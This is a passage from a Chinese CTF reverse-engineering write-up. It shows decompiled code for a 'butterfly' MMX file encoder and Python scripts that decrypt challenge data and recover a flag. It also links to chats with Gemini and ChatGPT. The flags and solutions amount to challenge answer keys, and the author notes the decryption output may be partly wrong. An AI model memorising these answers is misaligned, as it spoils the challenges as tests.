</span></span><span class="line"><span class="cl">            <span class="n">final_val</span> <span class="o">=</span> <span class="p">(</span><span class="n">v14</span> <span class="o">-</span> <span class="n">key2</span> <span class="o">-</span> <span class="p">(</span><span class="n">v12</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">            <span class="n">a1_buf</span><span class="p">[</span><span class="n">v12</span><span class="p">]</span> <span class="o">=</span> <span class="n">final_val</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">a1_buf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">a1_data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">&#34;54f6c590f050170247551cacc8be0265522a7853fe790fdd58f8556ad6cf0dda9f534c0db07b8e1d3f065f4e7f59e7db666d6629025a81faab149f70bccb6b67b7ea6b56ea3be73a04cf5c8b835e0391b6c0e22ef1e2269be74979&#34;</span><span class="p">)</span>  <span class="c1"># 示例</span>
</span></span><span class="line"><span class="cl">    <span class="n">a3_data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">&#34;8df5a27a8256629f1558a9d2d856a63ca87bb9f9651560b6167b74d71f5b2022a595518ea554627186354170c597b6de6555914e6594a231467581300657f61fd9b56f9c28ceb6b3f3bd77e4c03a170fefbeaddebebafeca0100000000000000&#34;</span><span class="p">)</span>  <span class="c1"># 示例，a3 必须足够长</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;处理前: </span><span class="si">{</span><span class="n">a1_data</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 假设 a4 = 0 (执行解密逻辑)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sub_403A50_py</span><span class="p">(</span><span class="n">a1_data</span><span class="p">,</span> <span class="n">a3_data</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;处理后: </span><span class="si">{</span><span class="n">a1_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">处理前</span><span class="p">:</span> <span class="mi">54</span><span class="n">f6c590f050170247551cacc8be0265522a7853fe790fdd58f8556ad6cf0dda9f534c0db07b8e1d3f065f4e7f59e7db666d6629025a81faab149f70bccb6b67b7ea6b56ea3be73a04cf5c8b835e0391b6c0e22ef1e2269be74979</span>
</span></span><span class="line"><span class="cl"><span class="n">处理后</span><span class="p">:</span> <span class="nb">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;ENCRYPTED:flag</span><span class="si">{5f8fe0cbc7253ww_he11obambi}</span><span class="s1">|SERVER:iked|TIME:1760252033|STATUS:SU</span><span class="se">\xe0</span><span class="s1">CES</span><span class="se">\xfb</span><span class="s1">|SEQ:0&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>万幸后面的部分错误没影响到flag字符串，感觉还是aes那里模式选取有点问题，解密出来的明文可能不太对</p>
<p>flag的值为flag{5f8fe0cbc7253ww_he11obambi}</p>
<p>这是和gemini、gpt对话的过程</p>
<ul>
<li><a href="https://gemini.google.com/share/9857c7842a01">https://gemini.google.com/share/9857c7842a01</a></li>
<li><a href="https://gemini.google.com/share/1eb7d5a528af">https://gemini.google.com/share/1eb7d5a528af</a></li>
<li><a href="https://chatgpt.com/share/68f503a1-106c-8006-98a8-15248dc6ee10">https://chatgpt.com/share/68f503a1-106c-8006-98a8-15248dc6ee10</a></li>
<li><a href="https://chatgpt.com/share/68f503b1-8e20-8006-b780-5c1bd8380d8f">https://chatgpt.com/share/68f503b1-8e20-8006-b780-5c1bd8380d8f</a></li>
</ul>
<h2 id="butterfly">butterfly</h2>
<p>函数主逻辑如下:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_4018D0</span><span class="p">(</span><span class="kt">int</span> <span class="n">n3</span><span class="p">,</span> <span class="n">_QWORD</span> <span class="o">*</span><span class="n">a2</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a4</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a5</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">n3</span> <span class="o">!=</span> <span class="mi">3</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">sub_4776D0</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="s">&#34;Usage: %s &lt;input_file&gt; &lt;output_file&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="n">a2</span><span class="p">,</span> <span class="n">a4</span><span class="p">,</span> <span class="n">a5</span><span class="p">,</span> <span class="n">a6</span><span class="p">,</span> <span class="n">v40</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="n">sub_4776D0</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="s">&#34;Example: %s plaintext.txt encoded.dat</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="n">a2</span><span class="p">,</span> <span class="n">v6</span><span class="p">,</span> <span class="n">v7</span><span class="p">,</span> <span class="n">v8</span><span class="p">,</span> <span class="n">v40</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">v10</span> <span class="o">=</span> <span class="n">a2</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="n">v11</span> <span class="o">=</span> <span class="n">a2</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="n">v12</span> <span class="o">=</span> <span class="n">sub_405540</span><span class="p">(</span><span class="n">v10</span><span class="p">,</span> <span class="s">&#34;rb&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v16</span> <span class="o">=</span> <span class="n">v12</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v12</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">sub_4776D0</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="s">&#34;Error: Cannot open file %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v10</span><span class="p">,</span> <span class="n">v13</span><span class="p">,</span> <span class="n">v14</span><span class="p">,</span> <span class="n">v15</span><span class="p">,</span> <span class="n">v40</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">sub_407480</span><span class="p">(</span><span class="n">v12</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">n7</span> <span class="o">=</span> <span class="n">sub_405640</span><span class="p">(</span><span class="n">v16</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">sub_407480</span><span class="p">(</span><span class="n">v16</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v18</span> <span class="o">=</span> <span class="n">sub_412620</span><span class="p">(</span><span class="n">n7</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v19</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__m64</span> <span class="o">*</span><span class="p">)</span><span class="n">v18</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v18</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">sub_405180</span><span class="p">(</span><span class="n">v16</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">sub_4774A0</span><span class="p">(</span><span class="s">&#34;Error: Memory allocation failed&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">n7_1</span> <span class="o">=</span> <span class="n">sub_41CC80</span><span class="p">(</span><span class="n">v18</span><span class="p">,</span> <span class="n">n7</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">n7</span><span class="p">,</span> <span class="n">v16</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">sub_405180</span><span class="p">(</span><span class="n">v16</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">n7</span> <span class="o">!=</span> <span class="n">n7_1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">sub_412CF0</span><span class="p">(</span><span class="n">v19</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">sub_4774A0</span><span class="p">(</span><span class="s">&#34;Error: File read failed&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="kr">__int16</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v19</span><span class="o">-&gt;</span><span class="n">m64_i16</span> <span class="o">+</span> <span class="n">n7</span><span class="p">)</span> <span class="o">=</span> <span class="n">n7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v24</span> <span class="o">=</span> <span class="n">_mm_loadu_si128</span><span class="p">((</span><span class="k">const</span> <span class="kr">__m128i</span> <span class="o">*</span><span class="p">)</span><span class="s">&#34;MMXEncode2024&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v40</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">v24</span><span class="p">.</span><span class="n">m128i_i64</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="n">v41</span> <span class="o">=</span> <span class="n">_mm_loadu_si128</span><span class="p">((</span><span class="k">const</span> <span class="kr">__m128i</span> <span class="o">*</span><span class="p">)</span><span class="s">&#34;coding file: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">sub_4776D0</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="s">&#34;Encoding file: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v10</span><span class="p">,</span> <span class="n">v21</span><span class="p">,</span> <span class="n">v22</span><span class="p">,</span> <span class="n">v23</span><span class="p">,</span> <span class="n">v24</span><span class="p">.</span><span class="n">m128i_i8</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">  <span class="n">sub_4776D0</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="s">&#34;Original size: %zu bytes</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">n7</span><span class="p">,</span> <span class="n">v25</span><span class="p">,</span> <span class="n">v26</span><span class="p">,</span> <span class="n">v27</span><span class="p">,</span> <span class="n">v40</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v42</span> <span class="o">=</span> <span class="n">v40</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">n7</span> <span class="o">&gt;</span> <span class="mi">7</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v28</span> <span class="o">=</span> <span class="n">v19</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">do</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">v29</span> <span class="o">=</span> <span class="n">_m_pxor</span><span class="p">((</span><span class="kr">__m64</span><span class="p">)</span><span class="n">v28</span><span class="o">-&gt;</span><span class="n">m64_u64</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kr">__m64</span> <span class="o">*</span><span class="p">)</span><span class="n">v42</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">v30</span> <span class="o">=</span> <span class="n">_m_por</span><span class="p">(</span><span class="n">_m_psrlwi</span><span class="p">(</span><span class="n">v29</span><span class="p">,</span> <span class="mi">8u</span><span class="p">),</span> <span class="n">_m_psllwi</span><span class="p">(</span><span class="n">v29</span><span class="p">,</span> <span class="mi">8u</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">      <span class="n">v28</span><span class="o">-&gt;</span><span class="n">m64_u64</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="n">_m_paddb</span><span class="p">(</span><span class="n">_m_por</span><span class="p">(</span><span class="n">_m_psllqi</span><span class="p">(</span><span class="n">v30</span><span class="p">,</span> <span class="mi">1u</span><span class="p">),</span> <span class="n">_m_psrlqi</span><span class="p">(</span><span class="n">v30</span><span class="p">,</span> <span class="mh">0x3Fu</span><span class="p">)),</span> <span class="o">*</span><span class="p">(</span><span class="kr">__m64</span> <span class="o">*</span><span class="p">)</span><span class="n">v42</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="o">&amp;</span><span class="n">v19</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="n">n7</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="n">v28</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="o">++</span><span class="n">v28</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span> <span class="o">&amp;</span><span class="n">v19</span><span class="p">[((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="n">n7</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="n">v28</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">_m_empty</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">sub_401CA0</span><span class="p">(</span><span class="n">v11</span><span class="p">,</span> <span class="n">v19</span><span class="p">,</span> <span class="n">n7</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">sub_4776D0</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="s">&#34;Successfully encoded to: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v11</span><span class="p">,</span> <span class="n">v31</span><span class="p">,</span> <span class="n">v32</span><span class="p">,</span> <span class="n">v33</span><span class="p">,</span> <span class="n">v40</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="n">sub_4776D0</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="s">&#34;Encoded size: %zu bytes</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">n7</span><span class="p">,</span> <span class="n">v34</span><span class="p">,</span> <span class="n">v35</span><span class="p">,</span> <span class="n">v36</span><span class="p">,</span> <span class="n">v40</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="n">sub_4777A0</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v42</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="s">&#34;%s.key&#34;</span><span class="p">,</span> <span class="n">v11</span><span class="p">,</span> <span class="n">v40</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">sub_401CA0</span><span class="p">(</span><span class="n">v42</span><span class="p">,</span> <span class="n">v40</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">sub_4776D0</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="s">&#34;Key saved to: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v42</span><span class="p">,</span> <span class="n">v37</span><span class="p">,</span> <span class="n">v38</span><span class="p">,</span> <span class="n">v39</span><span class="p">,</span> <span class="n">v40</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">sub_412CF0</span><span class="p">(</span><span class="n">v19</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>就是用MMXEncode2024构造密钥生成了流密码去对于输入的文件进行了加密,然后保存到encode.data</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="c1"># decrypt_keep_last4.py</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">hex_input</span> <span class="o">=</span> <span class="s2">&#34;8F A3 9C B7 70 8D 8F 98 9D BF 8C 99 8C 73 E5 90 &#34;</span> \
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;8D 8D 8C 85 88 79 85 7C 9D 9F 3C 53 16 15 19 12 &#34;</span> \
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;36 37 7D 0A&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">hex_str</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">hex_input</span><span class="o">.</span><span class="n">split</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="n">unhexlify</span><span class="p">(</span><span class="n">hex_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">K</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;MMXEncod&#34;</span>  <span class="c1"># first 8 bytes of &#34;MMXEncode2024&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rotr64</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">n</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">((</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="n">n</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="n">x</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">n</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">64</span> <span class="o">-</span> <span class="n">n</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">64</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">swap16_le</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">word</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">16</span><span class="o">*</span><span class="n">i</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span>
</span></span><span class="line"><span class="cl">        <span class="n">swapped</span> <span class="o">=</span> <span class="p">((</span><span class="n">word</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="n">word</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span> <span class="o">|=</span> <span class="p">(</span><span class="n">swapped</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">16</span><span class="o">*</span><span class="n">i</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">out</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt_block</span><span class="p">(</span><span class="n">block_bytes</span><span class="p">,</span> <span class="n">K</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">b</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">block_bytes</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">t3</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(((</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="n">K</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">t3_int</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">t3</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">t2_int</span> <span class="o">=</span> <span class="n">rotr64</span><span class="p">(</span><span class="n">t3_int</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">t_int</span> <span class="o">=</span> <span class="n">swap16_le</span><span class="p">(</span><span class="n">t2_int</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">t_bytes</span> <span class="o">=</span> <span class="n">t_int</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
